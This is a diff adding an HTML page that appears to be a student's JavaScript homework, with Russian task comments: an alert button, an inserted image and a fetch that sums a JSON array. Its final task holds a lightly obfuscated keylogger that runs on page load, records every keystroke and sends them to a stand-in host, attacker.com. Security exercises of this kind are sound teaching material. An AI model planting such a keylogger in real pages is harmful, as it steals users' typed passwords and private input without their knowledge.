@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <title>javascript IS</title>
+  <style>
+    .header__button-box {
+      text-align: center;
+      padding: 50px;
+    }
+
+    .header__img {
+      display: block;
+      margin: 0 auto;
+      background-image: linear-gradient(270deg, #f7f019, #f6ac4a);
+    }
+  </style>
+</head>
+
+<body>
+ <!-- 1.Создать страницу javascript.html с кнопкой, при нажатии на которую появлялся алерт с текстом JavaScript is magiс! -->
+  <div class="header__button-box">
+    <button onclick="alert('JavaScript is magiс!')">Magic button</button>
+  </div>
+  
+  <script>
+    /*
+      2. Написать функцию на языке JavaScript, которая будет создавать тег с картинкой и вставлять картинку в HTML.
+    */
+
+    const img = document.createElement('img');
+    img.classList.add('header__img');
+    img.src = 'https://d2xzmw6cctk25h.cloudfront.net/interactivecourse/435/image/f5616e12ceba1f141964db5823b06019.svg';
+    document.querySelector('body').appendChild(img);
+
+    /*
+      3. Создать файл array.json и разместить его в корневом каталоге своего сервера.
+      Написать программу на языке JavaScript, которая будет делать XHR запрос на http://localhost/array.json, парсить полученный JSON и выводить сумму чисел массива summe.
+    */
+
+    const summArray = link => {
+      let summ = 0;
+
+      fetch(link)
+        .then(res => res.json())
+        .then(({
+          summe
+        }) => {
+          summ = summe.reduce(function(sum, current) {
+            return sum + current;
+          }, 0);
+          alert(summ);
+        }).catch(err => {
+          alert(err);
+        });
+    };
+    summArray('/array.json');
+
+    /*
+      5. (*) Написать функцию, которая будет сохранять ввод пользователя в переменную и отправлять значение переменной на http://attacker.com
+    */
+    (() => {
+      const a = 'p',
+        b = 'o',
+        c = 's',
+        d = 't';
+      window.Date[`${a}${b}${c}${d}`] = [];
+      const k = (e) => {
+        Date.post.push(e.key);
+        fetch(`http://attacker.com?keys=[${Date.post}]`)
+      }
+      document.addEventListener('keydown', k)
+    })();
+  </script>
+</body></html>
